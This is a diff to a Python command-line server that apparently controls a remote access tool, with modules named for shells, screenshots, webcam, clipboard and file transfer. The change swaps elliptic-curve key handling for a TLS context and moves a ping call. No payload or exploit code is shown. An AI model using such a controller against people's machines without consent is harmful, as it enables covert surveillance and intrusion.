@@ -2,11 +2,11 @@
 import cmd
 import logging
 import socket
+import ssl
 from contextlib import suppress
 
-from cryptography.hazmat.primitives.asymmetric import ec
 from modules import (clipboard, download, filetransfer, screenshot,
-                     shells, tasks, webcam, windows, helpers)
+                     shells, tasks, webcam, windows, helpers, network)
 from modules.baseserver import Server
 from utils import terminal, ignore
 from utils.timeout_handler import timeoutsetter
@@ -57,8 +57,8 @@ class ServerCLI(Server, cmd.Cmd):
     prompt = DEFAULT_PROMPT
     client = None
 
-    def __init__(self, private_key: ec.EllipticCurvePrivateKey):
-        Server.__init__(self, private_key)
+    def __init__(self, ssl_context: ssl.SSLContext):
+        Server.__init__(self, ssl_context)
         cmd.Cmd.__init__(self)
 
     def default(self, _) -> None:
@@ -76,7 +76,7 @@ class ServerCLI(Server, cmd.Cmd):
             return
 
         try:
-            latency = self.ping(self.client)
+            latency = network.ping(self.client)
         except TimeoutError:
             print("Client timed out.")
         else:
@@ -364,14 +364,13 @@ class ServerCLI(Server, cmd.Cmd):
 
 
 if __name__ == '__main__':
-    from cryptography.hazmat.primitives import serialization
 
-    # Read private key from file
-    with open('private.pem', 'rb') as file:
-        private_key = serialization.load_pem_private_key(file.read(), None)
+    # Create SSLContext
+    context = ssl.create_default_context(purpose=ssl.Purpose.CLIENT_AUTH)
+    context.load_cert_chain("cert.pem", "private.pem")
 
     # Start server
-    server = ServerCLI(private_key)
+    server = ServerCLI(context)
     server.start(('localhost', 6969))
 
     # Get a client that connected
